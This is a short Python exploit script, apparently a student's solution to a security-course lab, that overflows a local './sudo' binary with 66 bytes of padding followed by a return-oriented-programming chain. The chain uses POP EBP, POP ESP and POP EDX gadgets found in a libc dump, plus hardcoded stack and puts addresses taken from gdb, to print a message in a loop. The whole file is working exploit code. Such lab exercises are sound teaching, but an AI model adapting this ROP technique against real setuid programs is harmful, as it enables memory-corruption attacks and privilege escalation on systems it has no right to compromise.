import os, sys
import struct
import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
	return 'Take me (%s) to your leader!' % student_id


def get_arg():
    import search
    gs = search.GadgetSearch('libc.bin',0xb7c39750)
    loop_add = 0xbfffe144 #taken from looking at gdb
    str_address = loop_add + 20  #counting number of commands
    puts_address = 0xb7c81ca0 #from gdb
    pop_ebp = gs.find('POP EBP').decode("hex")[::-1]
    pop_esp = gs.find('POP ESP').decode("hex")[::-1]
    skip_stack = gs.find('POP EDX').decode("hex")[::-1]
    my_str = get_string(304978372)
    return 'a'*66 + pop_ebp + struct.pack('<I',puts_address) + struct.pack('<I',puts_address) + skip_stack + struct.pack('<I',str_address) + pop_esp + struct.pack('<I',loop_add) +  my_str


def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())
    #os.execl('/usr/bin/gdb', '/usr/bin/gdb', '-ex=r', '--args', './sudo', get_arg())


if __name__ == '__main__':
    main(sys.argv)
